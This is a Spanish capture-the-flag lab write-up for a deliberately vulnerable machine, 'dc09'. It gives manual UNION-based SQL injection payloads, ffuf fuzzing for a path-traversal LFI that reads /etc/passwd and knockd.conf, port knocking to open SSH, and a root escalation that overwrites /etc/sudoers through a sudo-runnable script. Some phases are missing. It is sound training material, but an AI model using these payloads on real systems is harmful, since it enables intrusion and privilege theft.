# 🖥️ Máquina: dc09

> [!abstract] Ficha Técnica del Laboratorio
> **Sistema Operativo:** Linux  
> **Categoría:** Avanzadas  
> **Técnicas trabajadas:** SQL Injection manual · LFI · Port Knocking · Fuerza bruta SSH (hydra) · Escalada de privilegios (sudo + sobreescritura de sudoers)  
> **Descripción:** En esta práctica explotaremos una inyección SQL manual para extraer credenciales de la base de datos, encontraremos un LFI tras autenticarnos que nos revelará la configuración de Port Knocking para abrir el puerto SSH, realizaremos fuerza bruta SSH con las credenciales extraídas, encontraremos contraseñas adicionales ocultas en el home de un usuario y escalaremos privilegios abusando de un script Python ejecutable con sudo para sobreescribir el archivo sudoers.

## 💉 Fase 2: SQL Injection manual

Introducimos la siguiente prueba en el campo de búsqueda para verificar la vulnerabilidad:

```bash
test' or 1=1 -- -
```

> [!info] Resultado
> Devuelve todos los registros de la tabla. La aplicación es vulnerable a SQL injection. Ahora necesitamos averiguar cuántas columnas devuelve la consulta original para poder usar UNION SELECT. Probamos de más a menos hasta encontrar el número correcto:

```bash
cn' union select 1,2,3,4,5,6,7,8 -- -
```

```bash
cn' union select 1,2,3,4,5,6,7 -- -
```

```bash
cn' union select 1,2,3,4,5,6 -- -
```

> [!info] Resultado
> Con 6 columnas obtenemos resultados. A partir de aquí podemos inyectar consultas propias usando las posiciones que se muestran en pantalla. Extraemos la versión de la base de datos:

```bash
cn' union select 1,2,3,4,@@version,6 -- -
```

```text
Phone No: 10.3.17-MariaDB-0+deb10u1
```

Enumeramos los esquemas (bases de datos) disponibles:

```bash
cn' union select 1,2,3,4,schema_name,6 from INFORMATION_SCHEMA.SCHEMATA-- -
```

> [!info] Resultado
> Encontramos dos bases de datos con información relevante: Staff y users. Listamos todas las tablas:

```bash
cn' union select 1,2,3,4,table_name,6 from information_schema.tables-- -
```

> [!info] Resultado
> Tablas interesantes: Users, UserDetails y StaffDetails. Primero extraemos las columnas de la tabla Users:

```bash
cn' union select 1,2,3,4,column_name,6 from information_schema.columns where table_name="Users"-- -
```

## 🔐 Fase 3: LFI — descubrimiento de Port Knocking

Iniciamos sesión en la zona de administración con admin:transorbital1. Una vez dentro aparece el mensaje "File does not exist", lo que sugiere que la página acepta un parámetro de archivo. Buscamos el parámetro vulnerable con ffuf:

> [!warning] Advertencia
> ⚠️ Para construir el comando ffuf: abre las DevTools con F12, ve a la pestaña Red, recarga la página con la sesión de admin activa, haz clic derecho sobre la petición GET a welcome.php y selecciona Copiar como URL. Sustituye curl por ffuf y ajusta los parámetros como se muestra a continuación. La cookie PHPSESSID será diferente en tu sesión.

```bash
ffuf -c -u 'http://10.0.0.20/welcome.php?FUZZ=../../../../../../../../etc/passwd' \
  --compressed \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: PHPSESSID=9m5p1gc9hgk54hoe751qat3dh9' \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 963
```

```text
file  [Status: 200, Size: 1234]
```

> [!info] Resultado
> El parámetro vulnerable es file. Ahora lo usamos para enumerar archivos interesantes del sistema con un diccionario LFI especializado:

```bash
ffuf -c -u 'http://10.0.0.20/welcome.php?file=FUZZ' \
  --compressed \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
  -H 'Cookie: PHPSESSID=9m5p1gc9hgk54hoe751qat3dh9' \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt -fs 0
```

> [!info] Resultado
> Entre los resultados llama la atención el archivo knockd.conf. Lo leemos directamente desde el navegador:

```bash
curl 'http://10.0.0.20/manage.php?file=../../../../../../../../../etc/knockd.conf'
```

```text
[options]
UseSyslog

[openSSH]
sequence    = 7469,8475,9842
seq_timeout = 25
command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
tcpflags    = syn

[closeSSH]
sequence    = 9842,8475,7469
seq_timeout = 25
command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
tcpflags    = syn
```

> [!info] Resultado
> El archivo revela una configuración de Port Knocking. Port Knocking es un mecanismo de seguridad que mantiene puertos cerrados hasta que se recibe una secuencia específica de conexiones TCP en puertos concretos. Solo cuando el sistema detecta esa secuencia exacta abre el puerto indicado (en este caso el SSH) únicamente para la IP que realizó el knock.
> La secuencia para abrir SSH es: 7469 → 8475 → 9842.

## 🚪 Fase 4: Port Knocking — apertura del puerto SSH

Instalamos la herramienta knockd y lanzamos la secuencia:

```bash
sudo apt install knockd
```

```bash
knock 10.0.0.20 7469 8475 9842
```

Verificamos que el puerto SSH se ha abierto:

```bash
nmap -sT -p 22 10.0.0.20
```

```text
PORT   STATE SERVICE
22/tcp open  ssh
```

> [!info] Resultado
> Puerto SSH abierto. Ahora usamos las credenciales extraídas de la base de datos para intentar acceder.

## 🚀 Fase 6: Escalada de privilegios — sobreescritura de sudoers

```bash
ssh fredf@10.0.0.20
```

```text
fredf@10.0.0.20's password: B4-Tru3-001
```

```bash
sudo -l
```

```text
(root) NOPASSWD: /opt/devstuff/dist/test/test
```

> [!info] Resultado
> fredf puede ejecutar /opt/devstuff/dist/test/test como root sin contraseña. Exploramos qué hace:

```bash
sudo /opt/devstuff/dist/test/test
```

```text
Usage: python test.py read append
```

> [!info] Resultado
> Acepta dos argumentos: un archivo de origen (read) y uno de destino (append). Buscamos el código fuente para entender exactamente qué hace:

```bash
find / -name test.py 2>/dev/null
```

```bash
cat /opt/devstuff/test.py
```

> [!info] Resultado
> El script lee el contenido del archivo de origen y lo añade al final del archivo destino. Al ejecutarlo con sudo podemos añadir contenido a cualquier archivo del sistema, incluido /etc/sudoers.
> La estrategia es: crear un archivo con las líneas que queremos añadir al sudoers para darnos permisos completos, y luego usarlo para sobreescribir el archivo original. Primero copiamos el sudoers actual a /tmp para tenerlo como base:

```bash
sudo /opt/devstuff/dist/test/test /etc/sudoers /tmp/sudoers
```

Creamos un archivo con las líneas que queremos añadir:

```bash
nano /tmp/misudoers
```

```text
#includedir /etc/sudoers.d
fredf   ALL=(root) NOPASSWD: /opt/devstuff/dist/test/test
%fredf  ALL=(ALL:ALL) ALL
```

> [!info] Resultado
> Guardamos con CTRL+O y salimos con CTRL+X. Ahora sobreescribimos el sudoers original con nuestro archivo:

```bash
sudo /opt/devstuff/dist/test/test /tmp/misudoers /etc/sudoers
```

Iniciamos un nuevo bash para que cargue los nuevos permisos de sudo:

```bash
bash
```

```bash
sudo -l
```

> [!info] Resultado

```bash
sudo su
```
